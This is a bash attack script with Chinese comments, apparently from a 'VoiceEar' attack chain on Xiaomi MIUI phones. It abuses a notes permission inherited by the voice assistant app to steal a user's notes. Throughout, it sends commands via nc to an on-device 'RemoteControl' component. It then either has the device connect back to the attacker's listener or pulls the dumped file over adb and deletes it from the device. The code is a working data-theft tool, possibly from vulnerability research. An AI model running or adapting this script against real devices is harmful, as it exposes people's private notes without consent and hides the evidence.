#!/bin/bash
# steal-notes.sh
# 利用 com.miui.voiceassist 继承的 com.miui.notes.permission.ACCESS_NOTE 权限
# 通过 VoiceEar 攻击链触发后台笔记数据窃取（file 模式 + adb pull）
#
# 支持两种连接方式（自动检测）：
#   1. USB 数据线：优先使用
#   2. WiFi 无线：USB 不可用时使用
#
# 用法:
#   ./steal-notes.sh                          # 窃取全部笔记（自动检测 USB/WiFi）
#   ./steal-notes.sh list_folders             # 列出所有文件夹
#   ./steal-notes.sh steal_folder <folderId>  # 窃取指定文件夹
#   ./steal-notes.sh --wifi <device_ip> ...   # 强制使用 WiFi 模式

# ── 先处理 --wifi 参数（在 source common.sh 之前）────────────────────────────
FORCE_WIFI=false
DEVICE_WIFI_IP=""

if [ "$1" = "--wifi" ]; then
    FORCE_WIFI=true
    DEVICE_WIFI_IP="$2"
    shift 2
fi

source "${0%/*}/common.sh"

# ── 剩余参数解析 ───────────────────────────────────────────────────────────────
ACTION="${1:-steal_notes}"
FOLDER_ID="${2:-0}"

echo "================================================"
echo " VoiceEar - MIUI Notes 窃取攻击（File 模式）"
echo " Action  : $ACTION"
echo "================================================"

# ── 检测连接方式 ───────────────────────────────────────────────────────────────
echo "[*] 检测设备连接..."

# 检查 USB 连接
USB_DEVICE=$(adb devices | grep -v "List of devices" | grep "device$" | head -1 | awk '{print $1}')

if [ -n "$USB_DEVICE" ] && [ "$FORCE_WIFI" = false ]; then
    # USB 连接存在，使用 USB 模式
    echo "[+] 检测到 USB 连接: $USB_DEVICE"
    CONNECT_MODE="usb"
elif [ "$FORCE_WIFI" = true ] || [ -z "$USB_DEVICE" ]; then
    # 无 USB 或强制 WiFi，使用 WiFi 模式
    if [ -z "$DEVICE_WIFI_IP" ]; then
        echo "[!] 请指定设备 WiFi IP: ./steal-notes.sh --wifi <device_ip>"
        exit 1
    fi
    
    echo "[*] 使用 WiFi 模式，设备 IP: $DEVICE_WIFI_IP"
    CONNECT_MODE="wifi"
    # WiFi 模式直接用设备 IP 连 RemoteControl，不需要 adb over TCP
    DEVICE_IP="$DEVICE_WIFI_IP"
else
    echo "[!] 未检测到设备连接"
    echo "    USB 模式: 连接数据线"
    echo "    WiFi 模式: ./steal-notes.sh --wifi <device_ip>"
    exit 1
fi

echo "[*] 连接模式: $CONNECT_MODE"
echo "[*] Target: $DEVICE_IP:$PORT (RemoteControl)"

# ── 准备输出文件 ──────────────────────────────────────────────────────────────
OUTPUT_DIR="/home/ningfive/AndroidStudioProjects/VA-protect-feat-backtrace/VA-protect-feat-backtrace"
OUTPUT_FILE="$OUTPUT_DIR/notes_$(date +%Y%m%d_%H%M%S).json"
echo "[*] 结果将保存至: $OUTPUT_FILE"

# ── 根据 action 和连接模式构造 JSON 指令 ───────────────────────────────────────
if [ "$CONNECT_MODE" = "wifi" ]; then
    # WiFi 模式：设备主动回连攻击者，不依赖 adb
    # 使用 PC 在局域网上的真实 IP（不是 WSL2 虚拟 IP）
    RECV_PORT=25001
    PC_IP="192.168.255.63"  # 改为你 PC 的局域网 IP
    
    case "$ACTION" in
        steal_notes)
            CMD="{ \"Action\": \"steal_notes\", \"ServerAddress\": \"$PC_IP\", \"ServerPort\": $RECV_PORT }"
            ;;
        list_folders)
            CMD="{ \"Action\": \"list_folders_file\", \"ServerAddress\": \"127.0.0.1\", \"ServerPort\": 0 }"
            ;;
        steal_folder)
            CMD="{ \"Action\": \"steal_folder_file\", \"FolderId\": $FOLDER_ID, \"ServerAddress\": \"127.0.0.1\", \"ServerPort\": 0 }"
            ;;
        *)
            echo "[!] 未知 action: $ACTION"
            exit 1
            ;;
    esac

    echo "[*] 指令: $CMD"
    echo "[*] 发送攻击指令到 RemoteControl ($DEVICE_IP:$PORT)..."
    echo "$CMD" | nc -w 5 "$DEVICE_IP" "$PORT"
    if [ $? -ne 0 ]; then
        echo "[!] 指令发送失败，请确认设备在同一局域网且 RemoteControl 正在运行"
        exit 1
    fi
    echo "[+] 指令已发送，等待设备回传数据 (监听 0.0.0.0:$RECV_PORT)..."
    nc -l $RECV_PORT > "$OUTPUT_FILE"
    PULL_RC=$?
else
    # USB 模式：设备写文件，adb pull 拉取
    case "$ACTION" in
        steal_notes)
            CMD="{ \"Action\": \"steal_notes_file\", \"ServerAddress\": \"127.0.0.1\", \"ServerPort\": 0 }"
            REMOTE_FILE="/sdcard/notes_stolen.json"
            ;;
        list_folders)
            CMD="{ \"Action\": \"list_folders_file\", \"ServerAddress\": \"127.0.0.1\", \"ServerPort\": 0 }"
            REMOTE_FILE="/sdcard/notes_folders.json"
            ;;
        steal_folder)
            CMD="{ \"Action\": \"steal_folder_file\", \"FolderId\": $FOLDER_ID, \"ServerAddress\": \"127.0.0.1\", \"ServerPort\": 0 }"
            REMOTE_FILE="/sdcard/notes_folder_$FOLDER_ID.json"
            ;;
        *)
            echo "[!] 未知 action: $ACTION"
            echo "    可用: steal_notes | list_folders | steal_folder <folderId>"
            exit 1
            ;;
    esac

    echo "[*] 指令: $CMD"
    echo "[*] 发送攻击指令到 RemoteControl ($DEVICE_IP:$PORT)..."
    echo "$CMD" | nc -w 5 "$DEVICE_IP" "$PORT"
    if [ $? -ne 0 ]; then
        echo "[!] 指令发送失败，请确认 adb forward tcp:$PORT 已建立"
        exit 1
    fi
    echo "[+] 指令已发送"

    echo "[*] 等待设备写入文件..."
    sleep 4

    echo "[*] 拉取文件: $REMOTE_FILE"
    adb pull "$REMOTE_FILE" "$OUTPUT_FILE"
    PULL_RC=$?

    if [ $PULL_RC -eq 0 ]; then
        adb shell rm -f "$REMOTE_FILE"
        echo "[*] 设备上的临时文件已删除: $REMOTE_FILE"
    else
        echo "[!] 拉取失败，尝试直接删除设备文件..."
        adb shell rm -f "$REMOTE_FILE"
    fi
fi

echo ""
echo "================================================"
echo " 数据接收完成"
echo " 文件: $OUTPUT_FILE ($(wc -c < "$OUTPUT_FILE") bytes)"
echo "================================================"

if [ ! -s "$OUTPUT_FILE" ]; then
    echo "[!] 文件为空，可能窃取失败"
    exit 1
fi

# ── 格式化输出 ────────────────────────────────────────────────────────────────
if command -v jq &>/dev/null; then
    COUNT=$(jq 'length' "$OUTPUT_FILE" 2>/dev/null || echo "N/A")
    echo "[+] 共窃取条目数量: $COUNT"
    echo ""
    echo "--- 数据预览（前 3 条）---"
    jq '.[0:3][] | {id: ._id, title: .title, plain_text: .plain_text, modified: .modified_date_readable}' \
        "$OUTPUT_FILE" 2>/dev/null || true
else
    echo "[i] 提示: 安装 jq 可格式化输出 (sudo apt install jq)"
    echo "[+] 原始数据预览:"
    head -c 800 "$OUTPUT_FILE"
fi

echo ""
echo "[*] 完整数据: $OUTPUT_FILE"
echo "[*] 攻击完成"
